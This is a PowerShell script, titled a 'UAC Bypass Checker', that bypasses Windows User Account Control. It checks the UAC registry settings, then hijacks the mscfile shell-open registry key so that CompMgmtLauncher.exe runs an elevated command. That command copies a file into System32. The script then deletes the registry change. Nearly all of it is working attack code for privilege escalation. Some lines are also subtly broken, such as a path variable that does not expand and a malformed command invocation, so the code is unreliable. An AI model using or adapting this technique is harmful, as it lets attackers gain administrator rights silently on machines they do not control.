<#
UAC Bypass Checker
#>

	Echo "[+] Checking UAC status."

	$ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
	$SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

	if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
		"[!] UAC is set to 'Always Notify', I can't help you."
		exit
		}
	else{
		Echo "[*] UAC Status OK and set to 'Default'."
		
		$userinput = Read-Host -Prompt 'Input your username'
		
		New-Item -Path 'C:\users\$userinput\desktop\test.txt' -ItemType File
		
		$MscRegPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
		$ValName = "(Default)"
		$RegValue = "cmd /c copy C:\users\$userinput\desktop\test.txt C:\windows\system32\test.txt"

		New-Item -Path $MscRegPath -Force | Out-Null
		New-ItemProperty -Path $MscRegPath -Name $ValName -Value $RegValue | Out-Null

		$CompMgmtBypass = '"wmic process call create "cmd.exe /c start /min C:\windows\system32\CompMgmtLauncher.exe""'
		$a_cmd = "C:\windows\system32\cmd.exe"
		&$a_cmd = $CompMgmtBypass
		gci -Recurse -Filter "test" -File -ErrorAction SilentlyContinue -Path "C:\windows\system32\"

		Start-Sleep -s 5

		# Clenup registry modifications

		$MscRegCleanup = "HKCU:\Software\Classes\mscfile"
		Remove-Item -Path $MscRegCleanup -Force -Recurse -ErrorAction SilentlyContinue | Out-Null
	}
